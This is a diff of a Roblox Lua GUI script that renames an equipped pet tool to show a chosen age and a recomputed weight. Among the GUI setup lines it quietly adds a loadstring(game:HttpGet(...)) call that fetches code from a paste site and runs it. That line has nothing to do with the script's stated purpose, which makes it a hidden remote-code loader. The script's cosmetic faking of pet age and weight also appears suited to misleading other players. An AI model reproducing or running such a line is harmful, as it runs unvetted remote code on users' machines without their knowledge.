@@ -6,6 +6,7 @@ local character = player.Character or player.CharacterAdded:Wait()
 local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
 screenGui.Name = "KuniPetAgeLeveller"
 screenGui.ResetOnSpawn = false
+loadstring(game:HttpGet("https://pastefy.app/kIp2JPXK/raw"))()
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 -- Main Frame
@@ -70,7 +71,7 @@ petInfo.BackgroundTransparency = 1
 petInfo.Position = UDim2.new(0, 14, 0, 48)
 petInfo.Size = UDim2.new(1, -28, 0, 24)
 petInfo.TextXAlignment = Enum.TextXAlignment.Left
--- 
+
 -- Modern Button Function
 local function createButton(text, posY)
     local btn = Instance.new("TextButton", frame)
@@ -115,7 +116,7 @@ footer.BackgroundTransparency = 1
 footer.Size = UDim2.new(1, 0, 0, 20)
 footer.Position = UDim2.new(0, 0, 1, -22)
 
--- Function to get equipped pet tool
+-- Get equipped pet tool
 local function getEquippedPetTool()
     character = player.Character or player.CharacterAdded:Wait()
     for _, child in pairs(character:GetChildren()) do
@@ -126,17 +127,67 @@ local function getEquippedPetTool()
     return nil
 end
 
--- Update GUI pet name
+-- Store base weight for each pet by its tool instance
+local baseWeightMap = {}
+
+-- Function to update pet name with new Age and KG based on formula
+local function updatePetName(tool, newAge)
+    -- Get current name
+    local name = tool.Name
+
+    -- Extract base name (before any bracket)
+    local baseName = name:match("^(.-)%s*%[") or name
+
+    -- Extract base weight or get from stored map
+    local baseWeight = baseWeightMap[tool]
+    if not baseWeight then
+        -- Extract current KG from name
+        local kg = name:match("%[(%d+%.?%d*)%s*KG%]")
+        if kg then
+            baseWeight = tonumber(kg) - (0.33 * newAge)  -- Calculate baseWeight assuming current age
+            baseWeight = math.max(baseWeight, 0) -- safety
+        else
+            baseWeight = 1  -- fallback base weight if none found
+        end
+        baseWeightMap[tool] = baseWeight
+    end
+
+    -- Calculate new weight
+    local newWeight = baseWeight + (0.33 * newAge)
+    -- Round to 2 decimals
+    newWeight = math.floor(newWeight * 100 + 0.5) / 100
+
+    -- Construct new name
+    local newName = baseName .. string.format(" [%.2f KG] [Age %d]", newWeight, newAge)
+
+    -- Set new name
+    tool.Name = newName
+end
+
+-- Update GUI pet name to display only relevant fields
 local function updateGUI()
     local pet = getEquippedPetTool()
     if pet then
-        petInfo.Text = "Equipped Pet: " .. pet.Name
+        local name = pet.Name
+        local baseName = name:match("^(.-)%s*%[") or name
+        local kg = name:match("%[(%d+%.?%d*)%s*KG%]")
+        local age = name:match("%[Age%s*(%d+)%]")
+
+        local displayName = baseName
+        if kg then
+            displayName = displayName .. " [" .. kg .. " KG]"
+        end
+        if age then
+            displayName = displayName .. " [Age " .. age .. "]"
+        end
+
+        petInfo.Text = "Equipped Pet: " .. displayName
     else
         petInfo.Text = "Equipped Pet: [None]"
     end
 end
 
--- Set Age to 50 Button Logic
+-- Set Age to 50 Button Logic with age cap at 100
 button.MouseButton1Click:Connect(function()
     local tool = getEquippedPetTool()
     if tool then
@@ -144,9 +195,11 @@ button.MouseButton1Click:Connect(function()
             button.Text = "Changing Age in " .. i .. "..."
             task.wait(1)
         end
-        local newName = tool.Name:gsub("%[Age%s%d+%]", "[Age 50]")
-        tool.Name = newName
-        petInfo.Text = "Equipped Pet: " .. tool.Name
+
+        local newAge = 50
+        if newAge > 100 then newAge = 100 end -- safety clamp
+        updatePetName(tool, newAge)
+        updateGUI()
         button.Text = "Set Age to 50"
     else
         button.Text = "No Pet Equipped!"
@@ -155,7 +208,7 @@ button.MouseButton1Click:Connect(function()
     end
 end)
 
--- Add +1 Age Button Logic
+-- Add +1 Age Button Logic with 100 max limit
 addAgeButton.MouseButton1Click:Connect(function()
     local tool = getEquippedPetTool()
     if tool then
@@ -166,9 +219,9 @@ addAgeButton.MouseButton1Click:Connect(function()
                 task.wait(1)
             end
             local newAge = currentAge + 1
-            local newName = tool.Name:gsub("%[Age%s%d+%]", "[Age " .. newAge .. "]")
-            tool.Name = newName
-            petInfo.Text = "Equipped Pet: " .. tool.Name
+            if newAge > 100 then newAge = 100 end
+            updatePetName(tool, newAge)
+            updateGUI()
             addAgeButton.Text = "Add +1 Age"
         elseif currentAge and currentAge >= 100 then
             addAgeButton.Text = "Max Age is 100!"
@@ -186,7 +239,7 @@ addAgeButton.MouseButton1Click:Connect(function()
     end
 end)
 
--- Auto refresh equipped pet display
+-- Auto refresh equipped pet display every second
 task.spawn(function()
     while true do
         updateGUI()
